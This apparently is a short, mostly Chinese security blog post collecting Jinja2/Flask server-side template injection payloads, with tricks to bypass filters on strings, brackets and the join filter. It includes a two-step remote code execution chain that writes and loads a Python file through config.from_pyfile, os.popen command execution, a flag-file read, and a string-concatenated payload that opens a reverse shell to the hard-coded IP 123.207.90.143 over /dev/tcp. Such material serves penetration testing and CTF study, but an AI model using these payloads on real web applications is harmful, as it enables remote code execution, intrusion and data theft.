---
title: ssti
abbrlink: 28940
date: 2018-07-17 15:09:17
tags: python安全
---

## payload大全

####  bypass 各种字符串

1. 利用request.args

```
{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read
```

2. 利用字符串拼接

```python
{{request['__cla'+'ss__']['__m'+'ro__'][9]['__subcla'+'sses__']()[230]('''/bin/sh -c 
'l'''+'''s '''+chr(62)+'''& /dev/tcp/123.207.90.143/2333 0'''+chr(62)+'''&1 ''',shell=True)}}
```

3. 利用各种编码

   > "MTIzCg==".decode("base64")

4. 利用attr

```python
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
```

```
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

#### bypass "[" 和 "]"

1. 利用 attr

```
{{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
```

2. 进阶版 利用.getlist

```
{{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

#### bypassing "|join"

1. 利用format

```
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

#### FinalRce:

第一步:

```
http://localhost:5000/?exploit={%set a,b,c,d,e,f,g,h,i = request.__class__.__mro__%}{{i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&file=/tmp/foo.py&write=w&payload=print+1337
```

第二步:

```
http://localhost:5000/?exploit={%set a,b,c,d,e,f,g,h,i = request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%}{{(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)}}{{config.from_pyfile(request.args.file)}}&class=class&mro=mro&subc=subclasses&usc=_&file=/tmp/foo.py&write=w&payload=print+1337
```

#### Accessing parameters

In most examples we used request.args to access GET parameters, but there are other dictionaries that can be populated with custom values:

* GET: request.args
* Cookies: request.cookies
* Headers: request.headers
* Environment: request.environ
* Values: request.values

The following notations can be used to access attributes of an object:

* request.__class__
* request["__class__"]
* request|attr("__class__")

Elements of arrays can be accessed with:

* array[0]
* array.pop(0)

#### import

```python
{% import module %} – Allows you to import python modules.

Example: {% import subprocess %}

That’s all we need to craft an exploit code.

{% import os %}{{ os.popen("whoami").read() }}
```



